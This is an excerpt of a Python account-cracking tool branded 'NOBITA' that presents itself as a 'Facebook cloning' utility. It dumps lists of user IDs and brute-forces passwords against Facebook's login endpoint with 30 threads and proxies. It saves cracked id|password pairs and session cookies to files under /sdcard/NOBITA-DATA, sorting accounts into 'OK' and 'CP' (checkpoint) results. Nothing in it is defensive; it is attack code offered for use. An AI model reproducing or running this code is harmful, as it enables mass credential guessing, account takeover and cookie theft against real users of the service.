...
#Chnge Name 
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mNOBITA]')
...
def banner():
 ...
 _     _   _____   _____  _______  _______  _____  
(_)   (_) (_____) (_____)(_______)(__ _ __)(_____) 
(__)_ (_)(_)   (_)(_)__(_)  (_)      (_)  (_)___(_)
(_)(_)(_)(_)   (_)(_____)   (_)      (_)  (_______)
(_)  (__)(_)___(_)(_)__(_)__(_)__    (_)  (_)   (_)
(_)   (_) (_____) (_____)(_______)   (_)  (_)   (_)                                                               
...
def menu(my_name,my_id):
	...
	_____cowok__NOBITA_____ = input('\n CHOOSE : ')
	if _____cowok__NOBITA_____ in ['1']:
		dump_massal()
	elif _____cowok__NOBITA_____ in ['2']:
		result()
	elif _____cowok__NOBITA_____ in ['3']:
		dump_massal()
	elif _____cowok__NOBITA_____ in ['4']:
		crack_file()
	elif _____cowok__NOBITA_____ in ['5']:
		result()
	elif _____cowok__NOBITA_____ in ['0']:
...
def passwrd():
	...
	print(f'                    {m}I {k}T {h}S {u}N {b}O {u} B {b}T {u}A {h} O{k} K{m} Y{b} E{b}')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[purple]➣[green] FACEBOOK CLONING ID [purple] <<[yellow] '))
	print(f'[{h}•{u}]{h} OK : {h}%s '%(ok))
	print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
	print('{k}➣CRACK AGAIN ( Y/t ) ? ')
	woi = input('➣Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}➣{k} MUJI SUT ABA  CLONING{u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}NOBITA-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ NOBITA-CHECKPOINT ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ NOBITA-OK ❤️✨[green]')) 
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]   💗 IT.S NOBITA BROTHER  💗[red]'))
				print(f'\r{K}>> {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      💗NOBITA-IS-HERE💗[purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='NOBITA-CP'))
					open('/sdcard/NOBITA-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/NOBITA-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]NOBITA- OK[/bold green]'))
					ok+=1
					break
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> NOBITA       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
